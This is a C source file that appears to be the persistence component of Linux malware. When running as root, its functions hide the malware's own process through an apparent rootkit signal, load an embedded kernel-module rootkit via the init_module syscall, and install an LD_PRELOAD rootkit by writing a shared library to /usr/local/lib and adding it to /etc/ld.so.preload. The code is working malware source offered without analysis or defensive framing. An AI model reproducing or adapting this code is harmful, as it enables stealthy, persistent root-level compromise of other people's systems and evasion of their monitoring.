#include "rootkit.h"
#include "rootkit_bin.h"
#include "utils.h"

#define __NR_init_module 175

void try_hide(Globals *glob) {
  global = glob;
  DEBUG_LOG("[PERSIST] Hiding process\n");

  if (global->geteuid() != 0) {
    DEBUG_LOG("[PERSIST] Not running as root\n");
    return;
  }

  int pid = global->getpid();
  char pid_str[255];

  global->sprintf(pid_str, "%d", pid);

  global->link("h|ide", pid_str);
}

void try_persist(Globals *glob) {
  global = glob;

  DEBUG_LOG("[PERSIST] Trying to rookit!\n");
  if (global->geteuid() != 0) {
    DEBUG_LOG("[PERSIST] Not running as root\n");
    return;
  }

  DEBUG_LOG("[PERSIST] Loading kernel module\n");

  CHECK_SOFT(global->syscall(__NR_init_module, ROOTKIT_BIN,
                        sizeof(ROOTKIT_BIN) / sizeof(char), "") == -1);
}


void try_ld_preload(Globals *glob){
  global = glob;
  
  size_t microkit_len = <ld_preload_size>;
  char *microkit_data = "<ld_preload_data>";

  DEBUG_LOG("[PERSIST] Trying to install LD_PRELOAD rookit!\n");
  if (global->geteuid() != 0) {
    DEBUG_LOG("[PERSIST] Not running as root\n");
    return;
  }

  DEBUG_LOG("[PERSIST] Installing LD_PRELOAD rootkit\n");

  // write shared library to file
  char *rootkit_path = "/usr/local/lib/microkit.so";
  FILE *fd = global->fopen(rootkit_path, "wb");
  if (fd == NULL) {
      DEBUG_LOG_ERR("[PERSIST] fail to open the file for writing microkit\n");
      return;
  }
  if(!global->fwrite(microkit_data, microkit_len, 1, fd)){
      DEBUG_LOG_ERR("[PERSIST] Failed to create LD_PRELOAD rootkit\n");
      return;
      global->fclose(fd);
  }
  global->fclose(fd);
  
  // add entry to ld.so.preload for persistence
  size_t max_cmd_len = 420;
  char *persist_ld_preload_cmd = global->malloc(max_cmd_len);
  global->snprintf(persist_ld_preload_cmd, max_cmd_len, "echo \'%s\' > /etc/ld.so.preload", rootkit_path);
  global->system(persist_ld_preload_cmd);
  global->snprintf(persist_ld_preload_cmd, max_cmd_len, "chmod 644 \'%s\'", rootkit_path);
  global->system(persist_ld_preload_cmd);
  global->free(persist_ld_preload_cmd);
  DEBUG_LOG("[PERSIST] LD_PRELOAD rootkit installed\n");
}